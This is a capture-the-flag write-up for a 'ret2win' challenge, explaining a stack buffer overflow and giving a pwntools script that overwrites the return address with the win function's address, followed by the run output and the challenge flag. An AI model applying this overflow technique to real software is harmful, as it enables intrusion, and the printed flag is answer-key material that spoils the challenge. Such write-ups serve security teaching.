# Access Denied: ret2win

## Question 

Huh, jump, jump, jump to win.

server: nc 34.134.85.196 1337

[ret2win](ret2win)

## Solution

The program suffers a ``buffer overflow`` and has a ``win`` function. No real surprise here, spray the stack with p32(e.sym['win']) to overwrite the return address with the address of the ``win`` function

```python
from pwn import *

e = ELF('./ret2win')
#p=process(e.path)
p = remote('34.134.85.196',1337)
payload = p32(e.sym['win'])*100
p.sendline(payload)

p.interactive()

```

Running our script yields the flag 

```
$ python3 pwn-ret2win.py BIN=./ret2win
[*] '/root/workspace/access_denied/ret2win/ret2win'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 34.134.85.196 on port 1337: Done
[*] Switching to interactive mode
\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04\x16\x04
accessdenied{fl0w_fl0w_0v3rfl0w_g3t_w1n_07372581}
accessdenied{fl0w_fl0w_0v3rfl0w_g3t_w1n_07372581}
accessdenied{fl0w_fl0w_0v3rfl0w_g3t_w1n_07372581}
accessdenied{fl0w_fl0w_0v3rfl0w_g3t_w1n_07372581}
```
